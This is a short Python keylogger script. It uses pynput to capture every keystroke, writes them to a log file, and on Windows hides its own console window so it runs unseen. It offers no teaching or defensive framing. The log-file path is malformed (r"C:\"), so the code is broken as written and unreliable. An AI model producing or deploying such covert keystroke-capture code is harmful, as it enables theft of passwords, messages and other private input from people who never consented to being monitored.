from pynput import keyboard
import os

# Hide console window (Windows only)
if os.name == 'nt':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

log_file = r"C:\"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener on Escape key

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
